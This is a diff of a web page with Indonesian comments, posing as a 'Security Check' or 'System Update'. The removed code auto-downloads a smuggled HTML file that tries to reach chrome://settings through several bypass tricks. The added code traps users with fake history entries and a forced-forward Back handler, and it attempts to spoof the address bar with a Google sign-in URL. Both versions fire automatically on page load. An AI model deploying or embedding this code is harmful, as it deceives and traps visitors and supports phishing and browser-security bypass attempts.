@@ -3,115 +3,125 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Update</title>
+<title>System Verification</title>
 <style>
-  body { font-family: monospace; background: #111; color: #0f0; text-align: center; padding-top: 20vh; }
-  iframe { display: none; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #f4f6f8;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    height: 100vh; margin: 0; flex-direction: column;
+  }
+  .panel {
+    background: #fff; padding: 40px; border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
+    max-width: 450px; width: 100%; z-index: 10;
+  }
+  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
+  p { color: #666; margin-bottom: 20px; font-size: 14px; }
+  button {
+    background: #007aff; color: #fff; padding: 15px;
+    border-radius: 8px; font-size: 16px; font-weight: bold;
+    cursor: pointer; border: none; width: 100%; margin-bottom: 10px;
+  }
+  button:hover { background: #005bb5; }
+  #log {
+    margin-top: 20px; background: #000; color: #0f0;
+    padding: 10px; font-family: monospace; font-size: 12px;
+    border-radius: 6px; width: 100%; max-width: 450px;
+    height: 150px; overflow-y: auto; text-align: left;
+  }
 </style>
 </head>
 <body>
 
-<h1>🔒 Security Update</h1>
-<p id="status">Menyiapkan file pembaruan...</p>
+<div class="panel">
+  <h1>🔒 Security Check</h1>
+  <p id="status">Klik tombol di bawah untuk memverifikasi.</p>
+  <button id="startBtn">Verify System</button>
+</div>
+
+<div id="log">Sistem siap...</div>
 
 <script>
 (function () {
   'use strict';
 
+  var logEl = document.getElementById('log');
   var statusEl = document.getElementById('status');
+  
+  function log(msg) {
+    logEl.innerHTML += "> " + msg + "<br>";
+    console.log(msg);
+  }
 
   // ============================================
-  // 1. PAYLOAD INTERNAL BYPASS (DISELUNDUPKAN)
+  // 1. HISTORY TRAP (TAB-NABBING)
   // ============================================
-  var smuggledHTML = `
-    <!DOCTYPE html>
-    <html>
-    <head><title>System Bypass</title></head>
-    <body style="background:#000;color:#fff;font-family:monospace;text-align:center;padding-top:20vh;">
-      <h1>Executing Internal Bypass...</h1>
-      <p id="log">Memulai...</p>
-      <script>
-        (function() {
-          var logEl = document.getElementById('log');
-          function log(msg) { logEl.innerHTML += "<br>> " + msg; console.log(msg); }
-
-          var internalUrl = "chrome://settings";
-
-          log("Memulai bypass TANPA Blob URL");
-
-          // A. Direct Navigation (Mungkin diizinkan di file://)
-          setTimeout(function() {
-            try {
-              window.location.href = internalUrl;
-              log("Direct Navigation sent.");
-            } catch(e) { log("Direct fail: " + e.message); }
-          }, 1000);
-
-          // B. Iframe Sandbox
-          setTimeout(function() {
-            var iframe = document.createElement('iframe');
-            iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
-            iframe.src = internalUrl;
-            iframe.style.display = "none";
-            document.body.appendChild(iframe);
-            log("Iframe Sandbox sent.");
-          }, 2000);
-
-          // C. DATA URI WRAPPER (Pengganti Blob)
-          setTimeout(function() {
-            try {
-              var dataUri = "data:text/html;base64," + btoa('<script>window.top.location.href="' + internalUrl + '";<\\/script>');
-              
-              var iframe2 = document.createElement('iframe');
-              iframe2.src = dataUri;
-              iframe2.style.display = "none";
-              document.body.appendChild(iframe2);
-              log("Data URI Wrapper sent.");
-            } catch(e) { log("Data URI error: " + e.message); }
-          }, 3000);
-
-        })();
-      <\/script>
-    </body>
-    </html>
-  `;
-
-  // ============================================
-  // 2. FUNGSI HTML SMUGGLING (DATA URI ENCODE)
-  // ============================================
-  function triggerSmuggling() {
-    statusEl.innerText = "Merakit payload di memori...";
-
+  function trapHistory() {
+    log("[!] Memasang History Trap...");
+    
     try {
-      // Encode payload HTML ke Base64
-      var base64Payload = btoa(unescape(encodeURIComponent(smuggledHTML)));
+      // Push state berulang kali untuk mengisi riwayat (History Hijacking)
+      for (var i = 0; i < 20; i++) {
+        history.pushState({ trap: i }, "Security Check", window.location.pathname + "#trap=" + i);
+      }
       
-      // Buat Data URI (Bukan Blob URL)
-      var dataUri = "data:text/html;base64," + base64Payload;
-
-      // Trigger Download via Anchor (Data URI)
-      var a = document.createElement('a');
-      a.href = dataUri;
-      a.download = 'Security_Update.html'; 
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-
-      statusEl.innerText = "File berhasil diunduh. Silakan buka file tersebut.";
-
-      setTimeout(function() {
-        document.body.removeChild(a);
-      }, 5000);
-
-    } catch (e) {
-      statusEl.innerText = "Gagal: " + e.message;
+      // Pasang event listener: Jika user menekan tombol Back, paksa maju lagi
+      window.onpopstate = function() {
+        log("[!] User mencoba Back. Menahan di halaman...");
+        history.go(1);
+      };
+      
+      log("[+] History Trap terpasang (20 entry).");
+      statusEl.innerText = "Terverifikasi. (Coba klik Back browser)";
+      
+    } catch(e) {
+      log("[-] Gagal: " + e.message);
     }
   }
 
   // ============================================
-  // 3. EKSEKUSI (ZERO-CLICK)
+  // 2. UI SPOOFING (FAKE URL)
   // ============================================
-  setTimeout(triggerSmuggling, 1000);
+  function spoofURL() {
+    log("[!] Mencoba UI Spoofing...");
+
+    var fakeUrl = "https://accounts.google.com/signin/v2/identifier";
+    
+    try {
+      // Percobaan 1: replaceState ke URL Google
+      history.replaceState({ spoof: true }, "Sign in - Google Accounts", fakeUrl);
+      log("[+] replaceState ke Google BERHASIL (BUG!).");
+    } catch(e) {
+      log("[-] replaceState diblokir (SecurityError).");
+    }
+
+    try {
+      // Percobaan 2: pushState ke URL Google
+      history.pushState({ spoof: true }, "Sign in - Google Accounts", fakeUrl);
+      log("[+] pushState ke Google BERHASIL (BUG!).");
+    } catch(e) {
+      log("[-] pushState diblokir (SecurityError).");
+    }
+  }
+
+  // ============================================
+  // 3. ZERO-CLICK TRIGGER (OTOMATIS SAAT LOAD)
+  // ============================================
+  window.addEventListener('load', function() {
+    setTimeout(trapHistory, 1000);
+    setTimeout(spoofURL, 2000);
+  });
+
+  // ============================================
+  // 4. TOMBOL VERIFIKASI
+  // ============================================
+  document.getElementById('startBtn').addEventListener('click', function() {
+    trapHistory();
+    spoofURL();
+    statusEl.innerText = "Verifikasi selesai. Periksa Address Bar.";
+  });
 
 })();
 </script>
